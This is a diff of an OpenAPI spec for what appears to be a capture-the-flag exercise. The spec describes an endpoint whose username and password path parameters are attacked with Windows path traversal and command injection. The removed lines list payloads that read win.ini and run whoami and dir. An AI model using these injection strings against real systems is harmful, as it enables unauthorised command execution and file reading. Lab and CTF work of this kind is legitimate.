@@ -2,33 +2,26 @@ openapi: "3.0.0"
 info:
   title: "CTF Windows Swagger Exploit"
   version: "1.0.0"
-  description: |
-    Endpoint vulnerable a path traversal y/o command injection.
+  description: "Explotación Path Traversal / Command Injection en Windows"
 servers:
   - url: "https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003"
 paths:
   '/{Username}/{Password}':
     post:
       summary: "Explotar endpoint vulnerable"
-      description: |
-        Prueba payloads en Username y Password. Ejemplo:
-        - ..\..\..\..\..\..\Windows\win.ini
-        - & type C:\Windows\win.ini &
-        - & whoami &
-        - | dir C:\ |
       parameters:
         - name: Username
           in: path
           required: true
           schema:
             type: string
-          description: "Payload path traversal o command injection en Windows."
+          description: "Payload para prueba de traversal/injection"
         - name: Password
           in: path
           required: true
           schema:
             type: string
-          description: "Payload path traversal o command injection en Windows."
+          description: "Payload para prueba de traversal/injection"
       responses:
         '200':
           description: "Respuesta del servidor"
